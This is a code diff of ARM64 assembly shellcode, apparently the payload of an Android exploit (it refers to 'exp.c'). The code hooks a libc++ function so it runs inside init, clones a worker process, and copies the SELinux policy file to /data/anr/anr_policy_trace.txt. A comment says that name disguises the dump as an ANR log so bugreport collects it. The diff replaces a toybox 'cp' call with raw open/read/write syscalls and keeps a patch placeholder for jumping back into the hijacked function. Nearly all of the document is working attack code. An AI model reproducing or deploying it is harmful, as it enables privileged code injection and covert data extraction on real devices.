@@ -14,14 +14,8 @@ libcxx_data:
 
 mutex_file:
     .asciz "/dev/df"
-
-toybox_path:
-    .asciz "/system/bin/toybox"
-cmd_cp:
-    .asciz "cp"
 policy_src:
     .asciz "/sys/fs/selinux/policy"
-// 注意：这里伪装成 ANR 的日志文件，方便被 bugreport 打包
 policy_dst:
     .asciz "/data/anr/anr_policy_trace.txt" 
     .balign 4
@@ -33,7 +27,7 @@ libcxx_ko_target_off:
     .align 4
 
 libcxx_start:
-    // 现场保护 (8个 stp + 1个 str = 9 * 16 = 144 字节)
+    // 现场保护 (保存所有关键寄存器)
     stp x0, x1, [sp, #-16]!
     stp x2, x3, [sp, #-16]!
     stp x4, x5, [sp, #-16]!
@@ -48,7 +42,7 @@ libcxx_start:
     svc     0
     cbnz    w0, return
 
-    // 2. 检查 tid == 1
+    // 2. 检查 tid == 1 (确保是 init 的主线程)
     mov     x8, SYS_gettid
     svc     0
     cmp     w0, 1
@@ -66,11 +60,12 @@ libcxx_start:
 
     sub     sp, sp, 16
 
-    // 4. clone 子进程
+    // 4. 准备 clone 参数
     mov     x8, SYS_gettid
     svc     0
     str     w0, [sp, 8]
 
+    // 5. clone 子进程
     mov     x8, SYS_clone
     add     x4, sp, 8
     mov     x3, xzr
@@ -81,46 +76,77 @@ libcxx_start:
     str     w0, [sp, 8]
     add     sp, sp, 16
 
+    // 父进程 (init) 收到子进程 pid，直接返回
     cbnz    w0, return          
 
+// ── Worker 子进程 ──────────────────────────────────────────────────────
 worker:
-    // 分配 64 字节栈空间存放 argv (5个指针 = 40字节，16字节对齐)
-    sub     sp, sp, 64
+    // 分配 1024 字节作为读取缓冲区 (16字节对齐)
+    sub     sp, sp, 1024
 
-    // 5. 构造 argv: ["/system/bin/toybox", "cp", "src", "dst", NULL]
-    adr     x1, toybox_path
-    str     x1, [sp, 0]
-    
-    adr     x1, cmd_cp
-    str     x1, [sp, 8]
-    
+    // 6. 打开 /sys/fs/selinux/policy (只读)
+    mov     x0, -100
     adr     x1, policy_src
-    str     x1, [sp, 16]
-    
-    adr     x1, policy_dst
-    str     x1, [sp, 24]
-    
-    str     xzr, [sp, 32] // NULL 结尾
+    movl    x2, (O_RDONLY|O_CLOEXEC)
+    mov     x3, xzr
+    mov     x8, #SYS_openat
+    svc     0
+    tbnz    w0, #31, cleanup_df
+    mov     x20, x0  // 保存源文件 fd 到 x20
 
-    // 6. execve("/system/bin/toybox", argv, NULL)
-    adr     x0, toybox_path
+    // 7. 打开 /data/anr/anr_policy_trace.txt (写入、创建、截断)
+    mov     x0, -100
+    adr     x1, policy_dst
+    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
+    movl    x3, 0644
+    mov     x8, #SYS_openat
+    svc     0
+    tbnz    w0, #31, close_src
+    mov     x21, x0  // 保存目标文件 fd 到 x21
+
+read_loop:
+    // 8. read(src_fd, sp, 1024)
+    mov     x0, x20
     mov     x1, sp
-    mov     x2, xzr
-    mov     x8, #SYS_execve
+    movl    x2, 1024
+    mov     x8, #SYS_read
+    svc     0
+    
+    cmp     w0, #0
+    b.le    close_dst  // 如果读完了 (0) 或出错 (<0)，退出循环
+
+    // 9. write(dst_fd, sp, 读到的字节数)
+    mov     x22, x0
+    mov     x0, x21
+    mov     x1, sp
+    mov     x2, x22
+    mov     x8, #SYS_write
+    svc     0
+    
+    b       read_loop
+
+close_dst:
+    mov     x0, x21
+    mov     x8, #SYS_close
     svc     0
 
-    // execve 失败则恢复栈并清理
-    add     sp, sp, 64
-    b       cleanup_df
+close_src:
+    mov     x0, x20
+    mov     x8, #SYS_close
+    svc     0
 
 cleanup_df:
-    // 强制删除 /dev/df (保证下次能跑)
+    // 恢复栈指针 (极其关键，防止 init Panic)
+    add     sp, sp, 1024
+
+    // 强制删除 /dev/df (方便反复测试)
     mov     x0, -100
     adr     x1, mutex_file
     mov     x8, #SYS_unlinkat
     svc     0
 
 myexit:
+    // 子进程光荣退役
     mov     x0, #0
     mov     x8, #SYS_exit
     svc     0
@@ -137,7 +163,7 @@ return:
     ldp x0, x1, [sp], #16
 
 libcxx_first_inst_copy:
-    // 原函数第一条指令，防止 exp.c 的 jmpback 导致崩溃
+    // 供 exp.c 打补丁的占位符
     stp     x29, x30, [sp, #-32]!
     b       end
 end:
